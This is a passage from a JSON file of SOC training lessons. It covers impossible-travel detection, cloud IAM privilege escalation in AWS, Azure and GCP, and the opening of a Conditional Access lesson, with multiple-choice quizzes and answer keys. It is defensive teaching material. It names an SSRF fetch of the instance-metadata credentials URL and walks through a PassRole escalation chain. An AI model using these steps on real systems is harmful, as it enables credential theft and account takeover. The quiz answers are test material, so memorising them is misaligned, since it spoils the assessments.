      "content": "Impossible travel is famously prone to **false positives**, and a good analyst expects them. Several benign situations mimic the pattern.\n\n- **VPNs and corporate proxies** make a user appear to originate from a distant city or country, so a login from home plus a VPN exit node abroad looks like impossible travel.\n- **Mobile roaming and carrier-grade NAT** can route a phone through IP space geolocated far from the user's real position, producing jumps between sessions.\n- **Cloud-to-cloud services** and mail clients that fetch on the user's behalf from data-centre IPs can appear as a second, distant actor.\n- **Stale geolocation databases** occasionally misplace an IP by thousands of kilometres.\n\nBecause of this, never treat an isolated impossible-travel alert as confirmed compromise. **Investigate by correlation**, exactly as the worked walkthrough did: pull the user's sign-in logs and ask — are the two locations tied to known VPN or mobile ranges? Did the session use a compliant, familiar device (`deviceDetail.isCompliant`)? Were there companion signals such as an anonymous IP, atypical token, or a burst of denied MFA prompts (`riskEventTypes_v2`)? Did the account then perform sensitive actions, such as creating inbox forwarding rules, registering a new MFA method, or downloading large amounts of data? Those follow-on actions are the strongest confirmation of takeover.\n\nCheck the **`clientAppUsed`** field too, as the walkthrough did. A legitimate roaming user typically keeps a consistent client; an attacker often shows a different app, a scripted client, or an unusual mail protocol. Compare the flagged sign-in against the user's 30-day history for what 'normal' looks like.\n\n**Response** scales with confidence. For a likely false positive, you may dismiss the risk and, if appropriate, add the VPN range to known trusted locations. For a probable takeover, like the walkthrough's São Paulo sign-in, act decisively: **revoke active sessions and refresh tokens** (invalidating the stolen visitor badge), force a **password reset**, require **re-registration of MFA** (attackers often add their own methods), and hunt for persistence such as malicious OAuth grants or mailbox rules. Document the timeline, the confirming signals, and the containment steps so the case supports both this incident and future detection tuning. The discipline is always the same: prioritise by risk score, confirm by correlation, then respond in proportion to what the evidence actually shows."
    },
    {
      "heading": "Detection Engineering: Building the Hunt Yourself",
      "content": "Entra ID Protection runs impossible-travel detection natively, but a mature SOC still writes its own hunting queries — to tune thresholds for VIP accounts, to cover applications outside Entra's native coverage, or simply to practise the skill of turning a log pattern into a repeatable detection.\n\n### A starting KQL query in Microsoft Sentinel\n\nSentinel ingests Entra sign-in logs into a table called `SigninLogs`. A first-pass hunting query, using the same fields from the walkthrough, looks like this:\n\n```\nSigninLogs\n| where ResultType == 0\n| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ClientAppUsed\n| sort by UserPrincipalName asc, TimeGenerated asc\n```\n\nThis pulls every successful sign-in (`ResultType == 0`, matching the `status.errorCode: 0` field seen earlier), keeps only the fields you need, and orders them per user, oldest first — exactly the shape needed to compare one sign-in against the next one for the same person, the way you did by hand in the walkthrough.\n\nFrom here, an analyst or detection engineer adds logic to compute the time gap between consecutive rows for the same `UserPrincipalName`, look up each `Location`'s coordinates, calculate implied travel speed, and flag pairs exceeding a threshold (commercial-aircraft speed is a common baseline). This is precisely what Entra ID Protection already does internally, but building it yourself in KQL lets you tune sensitivity — for example, a lower threshold and tighter time window for finance or executive accounts, where the cost of a missed detection is higher than the cost of reviewing an extra false positive.\n\n### Turning a hunt into a standing detection\n\nOnce a query reliably surfaces true positives with an acceptable false-positive rate, save it as a **Sentinel analytics rule** on a schedule (say, every 15 minutes), and attach an **automation playbook**: on a high-confidence match, auto-revoke the user's sessions and open an incident, rather than waiting for an analyst to notice the alert. This closes the loop from the very first section's badge analogy: the moment a stolen badge is detected being used in two places at once, the system can invalidate the badge itself, automatically, before an analyst even opens the ticket."
    }
  ],
  "keyTakeaways": [
    "A sign-in is an authentication event that issues a token (a 'visitor badge'); a session is how long that token stays valid without re-checking credentials — this is why stolen tokens, not just stolen passwords, are a real threat, and why every sign-in's who/when/where is logged and comparable.",
    "Impossible travel compares the geolocation and timestamp of two consecutive sign-ins for the same account and flags implausible implied travel speed (e.g. Tel Aviv to São Paulo in 11 minutes is ~58,000 km/h); it is an offline detection in Entra ID Protection and maps to MITRE T1078.004, Valid Accounts: Cloud Accounts.",
    "It is one member of a family (unfamiliar properties, anonymous/Tor IPs, atypical tokens, MFA fatigue) visible in real sign-in log fields like riskLevelDuringSignIn, riskEventTypes_v2, deviceDetail.isCompliant, and clientAppUsed; the family is strongest when several fire on the same account at once, as shown in the worked two-entry walkthrough.",
    "Isolated impossible-travel alerts are often false positives from VPNs, mobile roaming, or stale geo data, so analysts confirm by correlating device compliance, client app, and follow-on actions before revoking sessions and forcing a reset.",
    "Beyond native detection, SOCs build their own hunts (e.g. a KQL query over Sentinel's SigninLogs comparing consecutive sign-ins per user) and turn reliable ones into scheduled analytics rules with automated response, tuning sensitivity for high-value accounts."
  ],
  "quiz": [
    {
      "question": "An account shows a sign-in from Tel Aviv at 09:00 and another from Frankfurt at 09:20, triggering an impossible-travel alert. Before escalating to account takeover, what is the most appropriate first investigative step?",
      "options": [
        {
          "label": "Immediately disable the account and force a password reset, since the geographic jump proves compromise.",
          "value": "a"
        },
        {
          "label": "Correlate the two sign-ins with device, IP type, and any companion risk signals to rule out VPN or roaming.",
          "value": "b"
        },
        {
          "label": "Ignore the alert entirely, because impossible-travel detections are always false positives from VPN use.",
          "value": "c"
        },
        {
          "label": "Add both Tel Aviv and Frankfurt to the trusted locations list so the alert stops firing in future.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Impossible travel is prone to false positives from VPNs and mobile roaming, so the right first move is to correlate the sign-ins with device, IP type, and companion signals before acting. Option a acts prematurely on an unconfirmed signal. Option c is wrong because the detection is meaningful and not always false; dismissing it blindly risks missing a real takeover. Option d suppresses evidence before understanding it, potentially blinding you to a genuine attack."
    },
    {
      "question": "In Microsoft Entra ID Protection, why does an impossible-travel detection sometimes appear in the console several minutes after the actual sign-ins occurred?",
      "options": [
        {
          "label": "Because it is an offline detection that correlates a pair of past events rather than evaluating one live sign-in.",
          "value": "a"
        },
        {
          "label": "Because the identity provider intentionally delays all alerts to reduce noise for the SOC team.",
          "value": "b"
        },
        {
          "label": "Because the user must manually approve the alert before it becomes visible to analysts.",
          "value": "c"
        },
        {
          "label": "Because impossible travel is only ever calculated once per day during a scheduled batch job.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Impossible travel is an offline detection: it needs to observe two sign-in events and compare their locations and times, so it surfaces after the fact rather than in real time. Option b is wrong because delays are due to correlation, not a blanket noise-reduction policy. Option c invents a user-approval step that does not exist. Option d is wrong because offline detections are computed as event pairs become available, not restricted to a single daily batch."
    },
    {
      "question": "You pull two consecutive sign-in log entries for one user: the first shows deviceDetail.isCompliant: true and clientAppUsed: 'Mobile Apps and Desktop clients'; the second, 11 minutes later from a different continent, shows isCompliant: false, clientAppUsed: 'Browser', and riskEventTypes_v2 containing anonymizedIPAddress. What does stacking these fields tell you?",
      "options": [
        {
          "label": "Nothing meaningful, since deviceDetail and clientAppUsed are cosmetic fields that carry no investigative value.",
          "value": "a"
        },
        {
          "label": "The second sign-in came from an unmanaged device via an anonymised connection with a different client, strongly supporting takeover.",
          "value": "b"
        },
        {
          "label": "The user simply switched from their phone to their laptop, which always explains a compliance and client-app change.",
          "value": "c"
        },
        {
          "label": "The riskEventTypes_v2 field only applies to malware detections and is unrelated to sign-in risk scoring.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Stacking an uncompliant/untrusted device, a changed client app, and an anonymised-IP risk event alongside impossible travel on the same account within minutes is exactly the multi-signal pattern that indicates a likely takeover rather than a coincidence. Option a is wrong; these fields are core evidence, not cosmetic. Option c is a plausible single explanation but does not account for the anonymised IP and impossible distance together. Option d is factually wrong: riskEventTypes_v2 lists sign-in risk detections, including anonymizedIPAddress."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks",
    "https://learn.microsoft.com/en-us/entra/id-protection/overview-identity-protection",
    "https://attack.mitre.org/techniques/T1078/004/",
    "https://learn.microsoft.com/en-us/entra/id-protection/howto-identity-protection-investigate-risk",
    "https://learn.microsoft.com/en-us/entra/id-protection/howto-identity-protection-configure-risk-policies"
  ],
  "xp": 260,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-iam-privilege-escalation",
  "slug": "cloud-iam-privilege-escalation",
  "title": "Cloud IAM and Privilege Escalation",
  "topic": "Cloud Security",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "In the cloud, identity is the perimeter. An attacker who lands with a low-privilege key rarely stops there; they look for a chain of misconfigurations that promotes them to administrator. This lesson assumes no prior cloud IAM background: it starts by defining what a cloud identity, a permission, and a policy document actually are, then covers the building blocks of cloud IAM, the shared-responsibility line, the classic privilege-escalation paths in AWS and Azure with real policy and CloudTrail JSON, a full worked escalation chain from a single vulnerability to full administrator access, and how a SOC analyst detects and defends against it.",
  "sections": [
    {
      "heading": "Start Here: What Cloud Identity, Permissions, and Policies Actually Are",
      "content": "### The hotel keycard analogy\n\nThink of a large hotel with many staff: housekeeping, maintenance, front desk, and management. Each staff member is issued a keycard (an identity) that opens only the doors their job requires — housekeeping's card opens guest rooms on their assigned floor, not the safe in the manager's office. A cloud account works the same way: every human and every application is represented by an identity, and **IAM** — **Identity and Access Management** — is the system of keycards and door rules that decides which locks each identity's card can open.\n\n### What is an action, a resource, and a permission?\n\nIn cloud terms, a **resource** is anything you might want to access: a storage bucket, a database, a virtual machine, or even another identity. An **action** is a specific thing you can do to a resource, like `s3:GetObject` (read a file from storage) or `iam:CreateUser` (create a new identity). A **permission** simply pairs the two: 'this identity may perform this action on that resource.'\n\n### What is a policy document?\n\nA **policy** is a JSON document that lists which actions are allowed or denied on which resources, and it is attached to a user, a group, or a role. Here is the simplest possible example, an AWS policy letting one identity read files from one storage bucket and nothing else:\n\n```\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"AllowS3ReadOnly\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\"s3:GetObject\", \"s3:ListBucket\"],\n      \"Resource\": [\"arn:aws:s3:::reports-bucket\", \"arn:aws:s3:::reports-bucket/*\"]\n    }\n  ]\n}\n```\n\nRead it as a sentence: 'Allow this identity to call GetObject and ListBucket, but only against the reports-bucket resource.' Nothing else is permitted — the identity cannot delete files, cannot read a different bucket, cannot touch anything not explicitly listed. This is the **principle of least privilege**: grant exactly what is needed, nothing more, the same way housekeeping's keycard opens guest rooms and nothing else.\n\n### What is the control plane, and why 'privilege escalation' matters more in the cloud\n\nEvery action you take to configure the cloud itself — creating a user, attaching a policy, launching a server — goes through the **control plane**, the cloud provider's own API. Every single control-plane call is authenticated and, crucially, **logged**. This matters enormously for this lesson: unlike a traditional network where an attacker moving between servers might leave no trace, in the cloud, every escalation attempt is an API call with a name, a timestamp, and a caller identity, sitting in a log you can read. The rest of this lesson is about learning which specific API calls, in which specific sequences, mean an attacker is climbing from a low-privilege keycard toward the manager's master key."
    },
    {
      "heading": "IAM Building Blocks and Shared Responsibility",
      "content": "With actions, resources, and policies defined, four more concepts complete the IAM picture.\n\nA **user** (or service principal) is a persistent identity with credentials. A **role** is a set of permissions that an identity can **assume** temporarily rather than own permanently; in AWS you call `sts:AssumeRole` to receive short-lived credentials for that role — think of it as a manager temporarily lending their master key for one specific task, then taking it back. A **trust policy** on a role defines exactly who is allowed to assume it, so a role is only as safe as its trust policy is tight. **Temporary credentials** are time-limited keys issued by the **Security Token Service** (STS in AWS, similar token services in Azure and GCP) so that workloads and federated users avoid long-lived secrets.\n\nRoles and temporary credentials are the healthy pattern: an EC2 instance or a Lambda function receives a role, and the cloud rotates its credentials automatically. The dangerous pattern is a long-lived **access key** stored in code or on disk, because a stolen key works until someone manually revokes it — unlike a temporary credential, which expires on its own even if never revoked.\n\n### The shared-responsibility line\n\nThe **shared-responsibility model** draws the line between what the cloud provider secures and what the customer secures. The provider is responsible for security **of** the cloud, meaning the physical hardware, hypervisor, and managed-service infrastructure. The customer is responsible for security **in** the cloud, meaning their data, their configuration, and critically their **IAM policies**. Provider docs summarise this as the vendor securing the platform while you secure your identities, access, and data.\n\nThis line matters for the SOC. When an S3 bucket is exposed or an over-broad policy like the ones in the next section is abused, that is a customer-side failure that no provider control will catch for you; it must be caught in your logs and your configuration reviews. IAM is squarely on the customer side, so misconfigured permissions are one of the most common and most impactful cloud risks. Understanding these primitives, user vs role, temporary vs long-lived credentials, trust policies, and where the responsibility line falls, is the prerequisite for spotting when an attacker turns a foothold into full control, which is what the next sections address."
    },
    {
      "heading": "Common Privilege-Escalation Paths",
      "content": "Once an attacker holds any valid cloud credential, they enumerate permissions and hunt for a path upward. Several recurring techniques appear across real incidents.\n\n**Over-permissive policies** are the simplest. A policy granting `iam:*` or, worse, wildcard `Action: *` on `Resource: *` lets the holder create new admin users, attach powerful policies to themselves, or edit policies directly:\n\n```\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    { \"Effect\": \"Allow\", \"Action\": \"iam:*\", \"Resource\": \"*\" }\n  ]\n}\n```\n\nAn identity with this attached simply calls `iam:AttachUserPolicy` or `iam:PutUserPolicy` to grant itself `AdministratorAccess`. Compare this to the tight, single-purpose policy from the primer — this is its opposite: a master key disguised as a single door pass.\n\n**iam:PassRole abuse** is subtler and very common. Many services let you launch a resource that runs with a role you specify. If an identity can call `iam:PassRole` on a high-privilege role and also launch a service such as Lambda, it can pass the powerful role to a resource it controls and then use that resource to act as the role:\n\n```\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\"iam:PassRole\", \"lambda:CreateFunction\", \"lambda:InvokeFunction\"],\n  \"Resource\": \"arn:aws:iam::123456789012:role/DataPipelineAdminRole\"\n}\n```\n\nSo a modest permission — 'create Lambda functions' — plus `PassRole` on one powerful role becomes full admin, because the attacker's Lambda function runs *as* `DataPipelineAdminRole`.\n\n**Privilege via role assumption** works when a role's **trust policy** (defined in the primer) is too loose, allowing an unintended principal to assume it. The attacker calls `AssumeRole` and inherits that role's permissions.\n\n**Access-key theft** covers stolen long-lived keys found in source code, CI logs, laptops, or public repositories. Because the key carries whatever the user can do, theft of an admin's key is instant escalation with no further trickery.\n\n**Metadata-service SSRF** is a cloud-specific classic, and MITRE catalogues it as **T1552.005, Unsecured Credentials: Cloud Instance Metadata API**. Cloud instances expose a link-local **metadata endpoint** at `169.254.169.254` that returns the instance's role credentials. If a web app on that instance is vulnerable to **SSRF** (server-side request forgery — covered in the OWASP Top 10 lesson), an attacker forces it to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and walks away with the instance role's temporary keys. **IMDSv2**, which requires a session token, was introduced specifically to blunt this attack; instances still on IMDSv1 remain exposed.\n\n| Path | Attacker action |\n|------|-----------------|\n| Over-permissive policy | Self-attach admin policy |\n| iam:PassRole | Pass powerful role to launched resource |\n| Loose trust policy | AssumeRole into higher privilege |\n| Access-key theft | Reuse stolen long-lived key |\n| Metadata SSRF | Steal instance role credentials |\n\nMost real escalations chain two or more of these, for example SSRF to grab a role, then `PassRole` to reach admin — walked start to finish in a later section."
    },
    {
      "heading": "Detection with CloudTrail and Azure Activity",
      "content": "Every cloud API call is logged, exactly as the primer's 'control plane' section promised, and that log trail is the SOC analyst's primary weapon against IAM abuse. In AWS the source is **CloudTrail**; in Azure it is the **Azure Activity Log** and **Entra audit logs**; in GCP it is **Cloud Audit Logs**. Learn to read the management-plane events that accompany escalation.\n\nHere is a real CloudTrail event for exactly the self-escalation described above, using the actual field names CloudTrail records:\n\n```\n{\n  \"eventVersion\": \"1.08\",\n  \"eventTime\": \"2026-08-16T10:02:31Z\",\n  \"eventSource\": \"iam.amazonaws.com\",\n  \"eventName\": \"AttachUserPolicy\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"userName\": \"svc-reporting\",\n    \"accountId\": \"123456789012\"\n  },\n  \"requestParameters\": {\n    \"userName\": \"svc-reporting\",\n    \"policyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\"\n  },\n  \"sourceIPAddress\": \"198.51.100.23\",\n  \"userAgent\": \"aws-cli/2.13.0\"\n}\n```\n\nRead it the way you would any log: `userIdentity.userName` is `svc-reporting` — a service account, not a human — and `requestParameters` shows it attached `AdministratorAccess` **to itself** (`requestParameters.userName` matches `userIdentity.userName`). A service account self-escalating to full admin, from an unfamiliar `sourceIPAddress`, using the raw `aws-cli` rather than its normal automation tooling, is close to a textbook confirmed compromise.\n\n### The IAM-mutating events to watch\n\nWatch for **IAM-mutating API calls** that rarely happen in normal operations: `CreateUser`, `CreateAccessKey`, `AttachUserPolicy`, `PutUserPolicy`, `CreateRole`, `UpdateAssumeRolePolicy` (a trust-policy change), and `CreatePolicyVersion`. In Azure, the equivalent is a role assignment change such as adding a principal to **Owner** or **User Access Administrator**, visible in the Activity Log's administrative category.\n\n**New access keys** deserve special attention. `CreateAccessKey` on an account that already has keys, or key creation immediately followed by unfamiliar API activity from a new IP, often marks an attacker establishing durable access. Correlate the key's first-use source IP and User-Agent against the user's baseline, exactly as you would correlate the `sourceIPAddress` and `userAgent` fields above.\n\n**Anomalous AssumeRole and PassRole** events matter too. Look for `AssumeRole` where the calling principal has never assumed that role before, or `RunInstances`/`CreateFunction` calls that pass an unusually powerful role. CloudTrail's `requestParameters` field records exactly which role ARN was passed, so you can see precisely what was handed to the new resource.\n\n**Metadata-credential theft** shows up indirectly: the stolen credentials belong to an instance role, so you may see that role's temporary keys suddenly used from an **external IP** rather than from inside the instance. Managed detection services help here: **AWS GuardDuty** raises findings such as credential exfiltration and anomalous IAM behaviour; **Microsoft Defender for Cloud** and **Entra ID Protection** raise similar identity alerts. Treat these as leads, then confirm in the raw audit trail like the CloudTrail event above."
    },
    {
      "heading": "A Worked Escalation Chain, Start to Finish",
      "content": "Individual events make more sense once you see them as one attacker's story. Here is a realistic, complete chain, tying together SSRF, the metadata endpoint, and `PassRole` from the earlier sections — the exact combination that most real-world incidents follow.\n\n| Time | Event | What it means |\n|------|-------|----------------|\n| 09:14 | SSRF exploited on a public web app | Attacker forces the server to request `169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role` |\n| 09:15 | Instance role's temporary keys used from an **external IP** | The stolen credentials are now used outside the instance — the strongest single tell that theft occurred |\n| 09:16 | `GetCallerIdentity` and `ListAttachedRolePolicies` (via CloudTrail) | Standard reconnaissance: the attacker checks who they are and what `webapp-role` can already do |\n| 09:19 | `CreateFunction` (Lambda) using `webapp-role`'s permissions | The attacker discovers `webapp-role` can create Lambda functions and can `iam:PassRole` on a separate, more powerful role, `DataPipelineAdminRole` |\n| 09:20 | `iam:PassRole` on `DataPipelineAdminRole`, attached to the new Lambda function | The new function now runs with `DataPipelineAdminRole`'s permissions — full data-pipeline admin, far beyond the original web app's role |\n| 09:22 | `AttachUserPolicy`, granting `AdministratorAccess` to a new IAM user created moments earlier | Using the Lambda function's elevated permissions, the attacker creates a brand-new, fully-privileged user for persistent access |\n\nWithin eight minutes, one SSRF vulnerability in a public web application became full account administrator access, entirely through legitimate-looking API calls — no exploit after the first step, only IAM misconfiguration chained step by step.\n\n### Why this chain matters for triage\n\nNotice that **no single event in this table looks catastrophic in isolation**. `CreateFunction` happens constantly in a healthy AWS account; `AttachUserPolicy` happens during legitimate onboarding. What makes this a confirmed incident is the **sequence and the timing**: role credentials normally confined to one instance suddenly calling IAM and Lambda APIs from an external address, within minutes, ending in a brand-new admin user. This is exactly why CloudTrail's `userIdentity` and `sourceIPAddress` fields matter so much — they let you reconstruct not just what happened, but that it was **one continuous actor**, moving faster than any legitimate change-management process would.\n\nThe practical lesson for a SOC: build detections not just for individual dangerous API calls, but for **sequences** — a role's credentials used from a new external IP followed within minutes by any IAM-mutating call is a far higher-fidelity alert than either event alone."
    },
    {
      "heading": "Defence: Least Privilege and Guardrails",
      "content": "Detection catches attacks in progress; sound IAM design prevents most of them from succeeding at all. The defensive playbook centres on a few durable principles, several of which would have broken the worked chain above at different points.\n\n**Least privilege** is the foundation, and it is literally the tight single-bucket policy from the very first section, applied everywhere. Grant each identity only the specific actions on the specific resources it needs, and prefer scoped resource ARNs over wildcards. Regularly review and prune permissions using access analysers and last-used data, because permissions accrete over time and unused grants are pure risk. Pay special attention to the sensitive actions that enable escalation, such as `iam:PassRole`, `iam:CreateAccessKey`, and policy-editing actions; restrict who can call them and on which roles. If `webapp-role` in the worked chain had never been allowed to `PassRole` on `DataPipelineAdminRole`, step three of the chain would have failed outright.\n\n### Eliminate long-lived keys\n\nReplace static access keys with **roles and temporary credentials** wherever possible. For workloads, use instance or workload identities that the platform rotates automatically. For humans, use **federated single sign-on** with short-lived sessions rather than IAM users with permanent keys. If long-lived keys must exist, rotate them, scope them tightly, and monitor their use closely. Never commit keys to source control, and scan repositories and CI logs for leaked secrets.\n\n### Guardrails that hold even when a policy is wrong\n\n**Guardrails** enforce limits that individual policies cannot bypass. In AWS, **Service Control Policies (SCPs)** at the organisation level can deny dangerous actions across every account regardless of local permissions, for example forbidding disabling of CloudTrail. **Permission boundaries** cap the maximum privileges an identity can ever hold, so even a self-attached admin policy is constrained. Azure offers similar controls through management-group policy and **Privileged Identity Management (PIM)** for just-in-time role activation, so no identity holds standing high privilege at all.\n\nHarden the specific escalation paths from the worked chain directly: enforce **IMDSv2** to defeat metadata SSRF (this alone stops the chain at 09:14), tighten **role trust policies** so only intended principals can assume each role, and require **MFA** for sensitive operations. Ensure the audit trail itself is protected: enable CloudTrail in all regions, deliver logs to a separate, access-restricted account, and alert on any attempt to stop or delete logging.\n\nFinally, close the loop between defence and detection. Every guardrail you add should have a matching alert for attempts to violate it, so the SOC learns when someone probes the boundary. Least privilege reduces the attack surface, no long-lived keys removes the easiest theft target, and guardrails ensure that even a mistake in one policy cannot become a full account takeover."
    },
    {
      "heading": "Beyond AWS: Azure and Multi-Cloud Notes",
      "content": "The concepts in this lesson, identity, role, policy, least privilege, are universal across clouds, but the exact names differ. A SOC covering multiple clouds needs the translation table as much as the concepts.\n\n### Azure's equivalents\n\nAzure uses **Azure RBAC (Role-Based Access Control)** instead of AWS's IAM policies. Permissions are granted through **role assignments**, pairing a **security principal** (a user, group, or **managed identity** — Azure's name for what AWS calls an instance role) with a **role definition** (a set of allowed actions, like AWS's policy) at a **scope** (a subscription, resource group, or single resource). The Azure equivalent of `iam:PassRole` abuse is assigning a workload a managed identity with broader rights than it needs; the equivalent of metadata-service SSRF is Azure's own **Instance Metadata Service**, reachable at the same `169.254.169.254` address, which also returns managed-identity tokens to anything that can make the server issue the request.\n\nAzure's guardrail equivalents are **Azure Policy** (organisation-wide rules, like SCPs) and **Privileged Identity Management**, mentioned above, which is Azure's answer to 'no identity should hold standing high privilege' — a role is activated **just-in-time**, for a limited window, with approval and logging, rather than granted permanently.\n\n### GCP's equivalents\n\nGoogle Cloud's IAM uses **roles** (predefined or custom, listing permissions) bound to **members** (users, service accounts, or groups) at a **resource hierarchy** level (organisation, folder, project, or resource). GCP's service accounts are the rough equivalent of AWS instance roles, and GCP has its own metadata server, also reachable via a link-local address, with similar SSRF exposure if a workload is vulnerable.\n\n### The translation table\n\n| Concept | AWS | Azure | GCP |\n|---------|-----|-------|-----|\n| Policy/permission set | IAM Policy | Role Definition | IAM Role |\n| Workload identity | Instance Role | Managed Identity | Service Account |\n| Assignment | Attach policy to user/role | Role Assignment | IAM Binding |\n| Org-wide guardrail | Service Control Policy | Azure Policy | Organization Policy |\n| Just-in-time privilege | (custom, via automation) | Privileged Identity Management | (custom, via automation) |\n| Audit log | CloudTrail | Activity Log / Entra audit logs | Cloud Audit Logs |\n\nWhatever the vendor, the analyst's job does not change: identify the identity, the permission it was granted, the action it took, and whether that action matches its normal, least-privilege baseline. The AWS-specific detail in this lesson, `PassRole`, `AttachUserPolicy`, CloudTrail field names, is the concrete example; the underlying skill, reading a control-plane log to reconstruct an escalation chain, transfers directly to every cloud you will ever work in."
    }
  ],
  "keyTakeaways": [
    "Cloud identity works like hotel keycards: an identity (user, role, or service principal) holds permissions (action + resource pairs) defined in a JSON policy document, and least privilege means granting only the exact doors each identity needs.",
    "Cloud privilege escalation chains misconfigurations like over-permissive policies, iam:PassRole abuse, loose role trust, stolen access keys, and metadata-service SSRF (MITRE T1552.005); IAM sits on the customer side of shared responsibility, so these failures are the SOC's to catch.",
    "Detection relies on management-plane logs (CloudTrail, Azure Activity, Entra audit) for anomalous IAM actions like self-attaching admin policies, new access keys, and role credentials used from external IPs — reading real fields like userIdentity, requestParameters, and sourceIPAddress lets you reconstruct a full escalation chain, not just isolated events.",
    "A realistic chain (SSRF steals instance-role creds -> creds used from an external IP -> PassRole into a powerful role -> AttachUserPolicy grants admin) takes minutes and no single step looks catastrophic alone; detection must catch the sequence, not just individual dangerous calls.",
    "Defence is least privilege, no long-lived keys, and guardrails (SCPs/Azure Policy, permission boundaries, IMDSv2, PIM/just-in-time access); the same concepts apply across AWS, Azure, and GCP under different names (IAM Policy/Role Definition/IAM Role, Instance Role/Managed Identity/Service Account)."
  ],
  "quiz": [
    {
      "question": "A web application running on an EC2 instance is vulnerable to SSRF. In CloudTrail you observe that the instance role's temporary credentials are suddenly making API calls from an external IP address the workload has never used. What has most likely happened?",
      "options": [
        {
          "label": "The provider's hypervisor was breached, which is the cloud vendor's responsibility under shared responsibility.",
          "value": "a"
        },
        {
          "label": "An attacker used SSRF to reach the metadata endpoint and stole the instance role's temporary credentials.",
          "value": "b"
        },
        {
          "label": "The instance rebooted, so its role credentials were automatically rotated to a new set of keys.",
          "value": "c"
        },
        {
          "label": "A legitimate developer copied the credentials to a laptop to debug the application locally.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "SSRF against the 169.254.169.254 metadata endpoint lets an attacker read the instance role's temporary credentials, which then appear used from an external IP, exactly the pattern described. Option a misassigns this to the provider; IAM and instance configuration are customer responsibilities. Option c is wrong because credential rotation does not cause use from an unfamiliar external IP. Option d is possible in theory but is prohibited practice and far less likely than SSRF given the stated vulnerability and the external-IP signal."
    },
    {
      "question": "Which combination of defences most directly reduces the risk that a modest identity can escalate to administrator through iam:PassRole and metadata-service theft?",
      "options": [
        {
          "label": "Enabling verbose application error pages and increasing the CloudTrail log retention period for audits.",
          "value": "a"
        },
        {
          "label": "Restricting iam:PassRole to specific roles and enforcing IMDSv2 on all instances to blunt metadata SSRF.",
          "value": "b"
        },
        {
          "label": "Granting broad wildcard permissions so fewer policies are needed and configuration stays simpler overall.",
          "value": "c"
        },
        {
          "label": "Rotating user passwords weekly and disabling multi-factor authentication to speed up developer logins.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Scoping iam:PassRole to specific roles removes the easy pass-to-powerful-role escalation, and enforcing IMDSv2 requires a session token that defeats simple metadata SSRF, directly addressing both named paths. Option a improves audit visibility but does not prevent either escalation and verbose errors can even aid attackers. Option c increases risk by widening permissions. Option d weakens security by removing MFA, making credential theft easier rather than harder."
    },
    {
      "question": "In the worked escalation chain, a CloudTrail event shows userIdentity.userName = 'svc-reporting' and requestParameters showing that same username attached policyArn AdministratorAccess to itself, from an unfamiliar sourceIPAddress. Why is this combination especially significant, more than any single field alone?",
      "options": [
        {
          "label": "It shows a service account, not a human, self-granted full admin from an unfamiliar location, matching a self-escalation pattern rather than routine onboarding.",
          "value": "a"
        },
        {
          "label": "It is significant only because AttachUserPolicy is always malicious regardless of who calls it or from where.",
          "value": "b"
        },
        {
          "label": "The sourceIPAddress field is cosmetic in CloudTrail and does not affect how an event should be triaged.",
          "value": "c"
        },
        {
          "label": "Service accounts are never expected to call any IAM API, so any IAM call from one is automatically a false positive.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "The combination of a service identity (not a human), granting itself administrator access (self-targeting), from a source IP that does not match its normal baseline, together form a self-escalation signature; no single field alone confirms this the way the combination does. Option b overstates AttachUserPolicy, which also occurs during legitimate onboarding. Option c is false; sourceIPAddress is a key correlation field. Option d is an overcorrection; some service accounts do legitimately call IAM APIs, which is why correlation with identity and self-targeting matters more than the mere occurrence of the call."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html",
    "https://attack.mitre.org/techniques/T1078/004/",
    "https://learn.microsoft.com/en-us/azure/security/fundamentals/shared-responsibility",
    "https://attack.mitre.org/techniques/T1552/005/",
    "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"
  ],
  "xp": 260,
  "estimatedMinutes": 50,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-conditional-access-risky-signins-entra",
  "slug": "conditional-access-risky-signins-entra",
  "title": "Conditional Access and Risky Sign-ins in Entra ID",
  "topic": "Microsoft Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Conditional Access is the policy engine at the heart of Microsoft Entra ID, deciding for every sign-in whether to allow, block, or demand stronger proof of identity. This lesson assumes no prior identity background: it starts by defining what a policy engine, a claim, and adaptive access control actually mean, then explains how Conditional Access works using a real policy definition, how risky users and sign-ins feed it using Identity Protection's actual sign-in log fields, why attackers try to evade it, and what the SOC analyst sees in the sign-in logs, with a worked hunting query at the end.",
  "sections": [
    {
      "heading": "Start Here: What a Policy Engine and Adaptive Access Actually Are",
